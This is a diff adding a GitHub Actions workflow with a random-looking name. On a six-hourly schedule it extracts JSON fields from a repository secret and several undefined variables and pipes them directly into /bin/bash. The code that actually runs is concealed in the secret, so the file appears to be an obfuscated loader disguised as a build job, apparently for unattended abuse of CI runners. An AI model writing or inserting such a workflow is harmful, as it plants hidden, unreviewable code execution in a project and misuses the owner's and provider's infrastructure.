@@ -1,0 +1,21 @@
+name: alkaliconclusion
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: alkaliconclusion
+        env:
+          vx54: ${{ secrets.vx54 }}
+        run: |
+          echo $vx54 | jq -r .rvua4 | /bin/bash
+          echo $srj71987 | jq -r .pjg82 | /bin/bash
+          echo $ukvgh910 | jq -r .uvzg03 | /bin/bash
+          echo $inkyo6 | jq -r .kdk81 | /bin/bash
+          echo $uxd85548 | jq -r .nnaz93 | /bin/bash
+
